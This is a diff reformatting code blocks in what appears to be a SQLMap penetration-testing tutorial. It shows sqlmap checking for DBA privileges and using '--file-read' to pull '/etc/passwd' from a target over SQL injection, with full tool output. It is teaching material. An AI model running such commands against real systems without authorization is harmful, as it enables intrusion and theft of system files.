@@ -1884,9 +1884,26 @@ As we can see, if we test that on one of the previous exercises, we get `curren
 
 To test OS exploitation, let's try an exercise in which we do have DBA privileges, as seen in the questions at the end of this section:
 
-```
-shell
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba         ___       __H__ ___ ___["]_____ ___ ___  {1.4.11#stable} |_ -| . [']     | .'| . | |___|_  ["]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 17:37:47 /2020-11-19/ [17:37:47] [INFO] resuming back-end DBMS 'mysql' [17:37:47] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... current user is DBA: True [*] ending @ 17:37:48 /2020-11-19/`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:37:47 /2020-11-19/
+
+[17:37:47] [INFO] resuming back-end DBMS 'mysql'
+[17:37:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: True
+
+[*] ending @ 17:37:48 /2020-11-19/
 ```
 
 We see that this time we get `current user is DBA: True`, meaning that we may have the privilege to read local files.
@@ -1899,8 +1916,9 @@ We see that this time we get `current user is DBA: True`, meaning that we may h
 
 Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the `--file-read` option:
 
-        shellsession
+```shell
 `adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"         ___       __H__ ___ ___[)]_____ ___ ___  {1.4.11#stable} |_ -| . [)]     | .'| . | |___|_  [)]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 17:40:00 /2020-11-19/ [17:40:00] [INFO] resuming back-end DBMS 'mysql' [17:40:00] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... [17:40:01] [INFO] fetching file: '/etc/passwd' [17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done) [17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex' [17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique [17:40:07] [INFO] fetching file: '/etc/passwd' do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y [17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B) files saved to [1]: [*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file) [*] ending @ 17:40:14 /2020-11-19/`
+```
 
 As we can see, SQLMap said `files saved` to a local file. We can `cat` the local file to see its content:
 
